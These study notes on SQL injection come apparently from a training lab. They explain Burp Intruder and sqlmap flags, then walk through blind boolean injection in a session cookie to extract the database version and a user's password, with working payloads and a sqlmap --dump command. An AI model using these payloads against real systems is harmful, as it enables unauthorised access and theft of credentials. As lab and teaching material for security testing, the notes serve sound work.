
# 🕵️‍♂️ SQL Injection Deep Dive Notes

---

## 🎯 Tools and Techniques

### 🔍 Intruder Sniper in Burp Suite

#### What is Intruder Sniper in Burp?

- **Definition:**  
  A tool in Burp Suite primarily used for tasks like:
  - Brute forcing login forms and session tokens.
  - Parameter manipulation.
  - Testing for SQL injections and other vulnerabilities.

---

## 🛠️ sqlmap Detailed Usage

### Understanding sqlmap Commands and Flags

#### Command: `sqlmap -r req-slqi2.txt --level=2`
- **Flag: `-level=2`**
  - **Explanation:**  
    Specifies the depth of testing, with levels ranging from 1 to 5 (default is 1).  
    Level 2 enables more comprehensive tests, increasing thoroughness and vulnerability detection.

---

#### Command: `sqlmap -r req-slqi2.txt --level=2 --dump -T injection0x02`
- **Flag: `T`**
  - **Explanation:**  
    Focuses on a specific table in the database (`injection0x02`), targeting it for data extraction.

---

### Interaction and Prompts in sqlmap

1. **Prompt:**  
   _"Do you want to store hashes to a temporary file for eventual further processing with other tools [y/N]?"_
   - **Meaning:**  
     Save discovered password hashes for later use with other tools.
   - **Answer Choice:** `n` (no) - Opt not to save hashes during this session.

2. **Prompt:**  
   _"Do you want to crack them via a dictionary-based attack? [Y/n/q]?"_
   - **Meaning:**  
     Attempts to crack the hashes using a dictionary attack.
   - **Answer Choice:** `n` (no) - Decline to perform cracking at this stage.

3. **Prompt:**  
   _"Do you want to URL encode cookie values (implementation specific)? [Y/n]"_
   - **Meaning:**  
     URL encode cookie values if necessary for HTTP transmission.
   - **Answer Choice:** `n` (no) - Skip URL encoding.

---

## 🔍 Lab Solution: Detecting SQL Injection in Cookies

### 1️⃣ **Investigating Application Behavior**
- Monitor all GET requests in Burp Suite Proxy.
- Test for SQL injection in cookies, as manual injection and fuzzing failed elsewhere.

---

### 2️⃣ **Analyzing Cookie Behavior**
- Example Cookie:  
  ```
  Cookie: session=6967cabefd763ac...57db
  ```
- **Baseline Test:**  
  - Send an invalid cookie to observe response differences.
  - Valid cookie response: `Content-Length = 1027`.  
  - Invalid cookie response: `Content-Length = 1928`.  
- **SQL Injection Test:**  
  ```
  Cookie: session=6967cabefd763ac...57db' and 1=1#
  ```
  - Response: `Content-Length = 1027` (accepted).  
    This confirms the cookie is vulnerable.

---

### 3️⃣ **Extracting Information**
- Use conditional SQL queries to retrieve data step by step:
  - Example:  
    ```
    Cookie: session=6967cabefd763ac...57db' and substring((select version()), 1, 5) = '8.0'#
    ```
  - Gradually reveal version details:  
    ```
    8.0.3
    ```

---

### 4️⃣ **Fuzzing with Burp Suite Intruder**
- Automate the process using Intruder:
  ```
  Cookie: session=6967cabefd763ac...57db' and substring((select password from injection0x02 where username='jessamy'), 1, 1) = 'b'#
  ```
- Use a payload of all possible characters to find matches based on response differences.

---

### 5️⃣ **Using sqlmap for Automation**
- Command:
  ```bash
  sqlmap -r req-slqi2.txt --level=2 --dump -T injection0x02
  ```
- Automates the detection and extraction process, revealing the vulnerable cookie and data.

---

## 🔄 Best Practices for Ethical Testing

- **Stay Within Limits:**  
  Avoid exceeding bug bounty limits (e.g., 5 requests/second).
- **Use Legal and Ethical Tools:**  
  Only test applications you have explicit authorization for.
- **Automate Wisely:**  
  Use tools like sqlmap judiciously to minimize unnecessary requests.

---

This deep dive demonstrates the power of both manual and automated SQL injection testing, emphasizing the importance of ethical and efficient practices.
